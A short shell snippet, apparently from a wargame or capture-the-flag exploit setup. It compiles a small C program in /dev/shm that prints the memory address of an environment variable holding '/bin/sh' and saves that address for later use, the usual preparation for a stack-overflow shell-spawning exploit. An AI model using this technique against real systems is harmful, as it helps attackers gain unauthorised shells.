cat << EOF > script.sh
    cd /dev/shm
    echo 'int main(int ac, char**av){printf("%p\n",(unsigned int)getenv("EXPL"));}' > expl.c
    gcc -w expl.c
    export EXPL=/bin/sh
    ./a.out > shelladdress
    cat /dev/shm/shelladdress
EOF
bash script.sh
SHELLADDRESS=`cat /dev/shm/shelladdress`
echo $SHELLADDRESS
